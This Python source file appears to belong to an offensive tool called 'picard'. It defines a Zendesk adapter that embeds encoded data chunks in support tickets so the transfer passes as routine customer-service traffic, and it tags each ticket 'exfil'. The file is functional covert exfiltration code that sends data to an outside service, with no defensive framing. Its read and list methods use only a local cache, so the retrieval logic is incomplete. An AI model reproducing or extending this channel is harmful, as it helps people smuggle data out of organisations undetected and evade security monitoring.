"""Zendesk adapter -- stores chunks as ticket comments.

Data is embedded inside Zendesk support ticket comments,
appearing as routine customer service traffic.

Requires: pip install picard[zendesk]  (uses aiohttp)
"""

from __future__ import annotations

import uuid
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef


class ZendeskAdapter(Adapter):
    """Scatter chunks into Zendesk ticket comments."""

    def __init__(
        self,
        subdomain: str,
        email: str,
        api_token: str,
        *,
        max_chunk_bytes: int = 4000,
    ) -> None:
        self._subdomain = subdomain
        self._email = email
        self._api_token = api_token
        self._max = max_chunk_bytes
        self._cache: dict[str, str] = {}

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="zendesk",
            max_chunk_bytes=self._max,
            persistent=True,
            ordered=True,
            rate_limit_per_min=60,
            ttl_seconds=None,
        )

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        import aiohttp

        chunk_id = uuid.uuid4().hex[:12]
        payload = {
            "ticket": {
                "subject": f"PICARD:{chunk_id}",
                "comment": {
                    "body": encoded_chunk,
                },
                "priority": "low",
                "tags": ["picard", "exfil"],
            }
        }
        auth = aiohttp.BasicAuth(
            f"{self._email}/token", self._api_token
        )
        headers = {"Content-Type": "application/json"}

        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"https://{self._subdomain}.zendesk.com/api/v2/tickets.json",
                json=payload,
                headers=headers,
                auth=auth,
            ) as resp:
                resp.raise_for_status()
                data = await resp.json()

        ticket_id = data.get("ticket", {}).get("id", chunk_id)
        location = f"zendesk://{self._subdomain}/tickets/{ticket_id}"
        self._cache[location] = encoded_chunk
        return StoredChunkRef(adapter_name="zendesk", location=location)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        if ref.location in self._cache:
            return self._cache[ref.location]
        raise KeyError(f"chunk not found: {ref.location}")

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        return self._cache.pop(ref.location, None) is not None

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        return [
            StoredChunkRef(adapter_name="zendesk", location=loc)
            for loc in self._cache
        ]

    async def health_check(self) -> bool:
        import aiohttp

        try:
            auth = aiohttp.BasicAuth(
                f"{self._email}/token", self._api_token
            )
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://{self._subdomain}.zendesk.com/api/v2/users/me.json",
                    auth=auth,
                ) as resp:
                    return resp.status == 200
        except Exception:
            return False

    async def capacity(self) -> dict[str, int | None]:
        used = sum(len(v.encode()) for v in self._cache.values())
        return {
            "used_bytes": used,
            "free_bytes": None,
            "total_bytes": None,
            "chunk_count": len(self._cache),
        }
